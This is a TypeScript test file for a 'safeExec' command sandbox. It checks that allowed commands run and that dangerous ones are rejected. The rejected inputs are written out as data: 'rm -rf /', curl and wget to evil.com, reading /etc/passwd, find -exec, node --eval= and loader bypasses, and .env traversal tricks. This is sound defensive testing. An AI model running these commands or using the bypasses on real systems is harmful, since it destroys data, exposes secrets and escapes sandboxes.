import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { safeExec, CommandError } from '@/lib/safeExec';
import { createWorkspace, TestWorkspace } from '../helpers/workspace';

describe('safeExec', () => {
  let ws: TestWorkspace;

  beforeEach(async () => {
    ws = await createWorkspace({
      'package.json': JSON.stringify({ name: 'test', version: '1.0.0' }),
    });
  });

  afterEach(() => ws.cleanup());

  // ── Allowed commands ──────────────────────────────────────────────────────
  describe('allowed commands', () => {
    it('runs echo', async () => {
      if (process.platform === 'win32') return;
      const result = await safeExec('echo hello', ws.root);
      expect(result.code).toBe(0);
      expect(result.stdout).toContain('hello');
    });

    it('runs ls', async () => {
      if (process.platform === 'win32') return;
      const result = await safeExec('ls', ws.root);
      expect(result.code).toBe(0);
      expect(result.stdout).toContain('package.json');
    });

    it('runs node --version', async () => {
      const result = await safeExec('node --version', ws.root);
      expect(result.code).toBe(0);
      expect(result.stdout).toMatch(/v\d+\.\d+/);
    });

    it('runs a single script path', async () => {
      await ws.write('probe.js', "console.log('probe-ok')");
      const result = await safeExec('node probe.js', ws.root);
      expect(result.code).toBe(0);
      expect(result.stdout).toContain('probe-ok');
    });

    it('runs git status', async () => {
      const result = await safeExec('git status', ws.root);
      expect(result.code).toBe(0);
    });
  });

  // ── Blocked commands ──────────────────────────────────────────────────────
  describe('blocked commands', () => {
    it('blocks rm', async () => {
      await expect(safeExec('rm -rf /', ws.root)).rejects.toThrow(
        CommandError
      );
    });

    it('blocks curl', async () => {
      await expect(
        safeExec('curl http://evil.com', ws.root)
      ).rejects.toThrow(CommandError);
    });

    it('blocks wget', async () => {
      await expect(
        safeExec('wget http://evil.com', ws.root)
      ).rejects.toThrow(CommandError);
    });

    it('blocks python', async () => {
      await expect(
        safeExec('python -c "import os; os.system(\'id\')"', ws.root)
      ).rejects.toThrow(CommandError);
    });

    it('blocks bash', async () => {
      await expect(
        safeExec('bash -c "cat /etc/passwd"', ws.root)
      ).rejects.toThrow(CommandError);
    });

    it('blocks sh', async () => {
      await expect(
        safeExec('sh -c "id"', ws.root)
      ).rejects.toThrow(CommandError);
    });

    it('blocks sudo', async () => {
      await expect(
        safeExec('sudo npm install', ws.root)
      ).rejects.toThrow(CommandError);
    });

    it('blocks npx', async () => {
      await expect(
        safeExec('npx create-react-app app', ws.root)
      ).rejects.toThrow(CommandError);
    });
  });

  // ── Blocked binary path segments ──────────────────────────────────────────
  describe('blocked binary path segments', () => {
    it('blocks absolute paths', async () => {
      await expect(
        safeExec('/usr/bin/node -v', ws.root)
      ).rejects.toThrow(CommandError);
    });

    it('blocks relative paths', async () => {
      await expect(
        safeExec('./node -v', ws.root)
      ).rejects.toThrow(CommandError);
    });
  });

  // ── Blocked git subcommands ───────────────────────────────────────────────
  describe('blocked git subcommands', () => {
    it('blocks git push', async () => {
      await expect(
        safeExec('git push origin main', ws.root)
      ).rejects.toThrow(CommandError);
    });

    it('blocks git clone', async () => {
      await expect(
        safeExec('git clone https://github.com/evil/repo', ws.root)
      ).rejects.toThrow(CommandError);
    });

    it('blocks git remote', async () => {
      await expect(
        safeExec('git remote add origin evil', ws.root)
      ).rejects.toThrow(CommandError);
    });
  });

  // ── Dangerous argument patterns ───────────────────────────────────────────
  describe('blocked argument patterns', () => {
    it('blocks eval', async () => {
      await expect(
        safeExec('node --eval "console.log(1)"', ws.root)
      ).rejects.toThrow(CommandError);
    });

    it('blocks redirection', async () => {
      await expect(
        safeExec('echo hello > output.txt', ws.root)
      ).rejects.toThrow(CommandError);
    });

    it('blocks node -p and --print', async () => {
      await expect(
        safeExec('node -p "process.exit(1)"', ws.root)
      ).rejects.toThrow(CommandError);
      await expect(
        safeExec('node --print "process.exit(1)"', ws.root)
      ).rejects.toThrow(CommandError);
    });

    it('blocks node -r and --require', async () => {
      await expect(
        safeExec('node -r fs', ws.root)
      ).rejects.toThrow(CommandError);
      await expect(
        safeExec('node --require fs', ws.root)
      ).rejects.toThrow(CommandError);
    });

    it('blocks the --flag=value form of every dangerous node flag (the real bypass)', async () => {
      // Live-confirmed prior to the fix: node --eval="..." executed code
      // because the old blocklist only matched the bare "--eval" token.
      await expect(
        safeExec('node --eval="console.log(1)"', ws.root)
      ).rejects.toThrow(CommandError);
      await expect(
        safeExec('node --require=fs', ws.root)
      ).rejects.toThrow(CommandError);
      await expect(
        safeExec('node --print=1', ws.root)
      ).rejects.toThrow(CommandError);
    });

    it('blocks any node flag outside the safe allowlist', async () => {
      await expect(
        safeExec('node --inspect=0.0.0.0:9229', ws.root)
      ).rejects.toThrow(CommandError);
      await expect(
        safeExec('node --experimental-loader=./evil.mjs', ws.root)
      ).rejects.toThrow(CommandError);
    });

    it('blocks node with extra arguments after the script path', async () => {
      await ws.write('probe.js', "console.log('probe-ok')");
      await expect(
        safeExec('node probe.js --anything', ws.root)
      ).rejects.toThrow(CommandError);
    });

    it('blocks find -exec (the GTFOBins-class bypass)', async () => {
      await expect(
        safeExec('find . -maxdepth 0 -exec echo pwned {} +', ws.root)
      ).rejects.toThrow(CommandError);
      await expect(
        safeExec('find . -execdir echo pwned {} +', ws.root)
      ).rejects.toThrow(CommandError);
    });

    it('blocks find -delete', async () => {
      await expect(
        safeExec('find . -name "*.ts" -delete', ws.root)
      ).rejects.toThrow(CommandError);
    });

    it('still allows safe find primaries', async () => {
      if (process.platform === 'win32') return;
      const result = await safeExec('find . -maxdepth 1 -name "*.json"', ws.root);
      expect(result.code).toBe(0);
      expect(result.stdout).toContain('package.json');
    });

    it('blocks .env bypasses', async () => {
      await expect(
        safeExec('cat "./.env "', ws.root)
      ).rejects.toThrow(CommandError);
      await expect(
        safeExec('cat .env/../.env', ws.root)
      ).rejects.toThrow(CommandError);
      await expect(
        safeExec('cat .env.local', ws.root)
      ).rejects.toThrow(CommandError);
    });
  });
});
